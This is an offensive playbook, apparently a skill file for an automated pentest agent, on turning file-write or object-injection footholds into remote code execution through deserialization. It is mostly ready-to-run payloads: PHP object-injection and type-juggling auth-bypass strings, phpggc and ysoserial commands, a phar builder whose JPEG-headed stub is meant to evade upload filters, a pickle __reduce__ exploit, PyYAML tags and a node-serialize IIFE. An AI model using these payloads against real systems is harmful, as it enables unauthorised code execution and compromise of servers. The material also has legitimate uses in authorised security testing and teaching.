# File-write / deserialization to RCE — gadget glue — Open WHEN: you hold a file-write or object-injection foothold and need to turn it into code execution by feeding a serialized gadget into a deserialization sink (or a phar:// archive into a PHP file op)

This is the glue for **Chain B**. You have a place to put bytes; the app later
reads them back into a live object. If a class touched during deserialization
runs code in a magic method, you get RCE. Detect the format, then generate the
matching gadget with the right tool. (The `deserialization` sibling skill owns
discovery and per-class theory — this file is the chain shortcut.)

## Identify the format by header bytes

| Format          | Hex header           | Base64 prefix | Other tells |
|-----------------|----------------------|---------------|-------------|
| PHP serialized  | `4F 3A` (`O:`)       | `Tz`          | `O:`, `a:`, `s:`, `i:`, `b:` with length counts |
| Java serialized | `AC ED 00 05`        | `rO0`         | `Content-Type: application/x-java-serialized-object`; `H4sIA…` if gzip+b64 |
| .NET            | `00 01 00 00 00 FF…` | `AAEAAAD`     | ViewState `FF 01` / `/w`, hidden form inputs |
| Python pickle   | `80 04 95`           | `gASV`        | text opcodes like `(lp0`, `S'...'` |
| Ruby Marshal    | `04 08`              | `BAgK`        | `\x04\x08` at start |

## PHP — `unserialize()` object injection

Magic methods that fire on deserialize: `__wakeup()` (on unserialize),
`__destruct()` (on object teardown), `__toString()` (on string cast). A POP
chain strings these together to reach `system()`/`eval()`. Minimal example
against a class with a vulnerable `__wakeup`:
```
O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
```
Type-juggling auth bypass (because `true == "anystring"`):
```
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```
Generate framework gadget chains with **phpggc** (Laravel, Symfony, Monolog,
Guzzle, Doctrine, SlimPHP, SwiftMailer):
```
phpggc monolog/rce1 assert 'phpinfo()'
phpggc Guzzle/RCE1 system 'id'
phpggc monolog/rce1 'phpinfo();' -s          # URL-safe output
```

## PHP — phar:// deserialization (no unserialize() call needed)

Any PHP file op on a `phar://` path (`file_get_contents`, `include`,
`file_exists`, `getimagesize`, `fopen`, …) deserializes the archive's
**metadata**, firing a POP chain — even though the source never calls
`unserialize()`. So a file-write or LFI that lets you reference a `.phar` is a
deserialization sink.

Build a phar locally with `php` (the stub can wear a JPEG/PNG magic-byte
header so it passes image upload filters):
```php
<?php
class AnyClass { public $data; function __destruct(){ system($this->data); } }
$p = new Phar('test.phar'); $p->startBuffering();
$p->addFromString('x.txt','text');
$p->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");   // JPEG-headed stub
$p->setMetadata(new AnyClass()); // object whose __destruct runs your command
$p->stopBuffering();
```
Set `$obj->data` to your command, upload, then make the app touch
`phar://uploads/test.phar/x.txt`. phpggc can also emit a phar directly:
`phpggc Monolog/RCE2 system 'id' -p phar -o evil.phar`.

## Java — ysoserial

Pick a gadget matching a library on the server's classpath
(CommonsCollections1-7, Spring1/2, Groovy1, ROME, C3P0, Hibernate1/2,
JRMPClient). `URLDNS` is the safe detector — it only triggers a DNS lookup, so
use it first to confirm the sink before a code-exec gadget:
```
java -jar ysoserial.jar URLDNS http://<oob-host>/ > probe.bin      # detect
java -jar ysoserial.jar CommonsCollections5 'id' > payload.bin     # exec
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' | gzip | base64   # gzip+b64 sink
```

## Python — pickle / PyYAML

Sinks: `pickle.loads`, `cPickle.loads`, `_pickle.loads`, `jsonpickle.decode`,
`yaml.unsafe_load`, `yaml.load(..., Loader=UnsafeLoader)`. Pickle runs the
return of `__reduce__` on load:
```python
import pickle, base64
class RCE:
    def __reduce__(self):
        return eval, ("__import__('os').system('id')",)
print(base64.b64encode(pickle.dumps(RCE())).decode())
```
PyYAML unsafe loaders execute object constructors:
```yaml
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.Popen [["id"]]
```

## Node — node-serialize / funcster

`unserialize()` from `node-serialize` runs an Immediately-Invoked Function
Expression. Append `()` to the serialized function to force execution:
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)})}()"}
```
Look for `node-serialize`, `serialize-to-js`, `funcster` in the source.

## Ruby — Marshal

`Marshal.load` on user input can reach a universal RCE gadget. Detect the
`\x04\x08` header; generate the chain with the documented universal gadget for
the app's Ruby/Rails version.
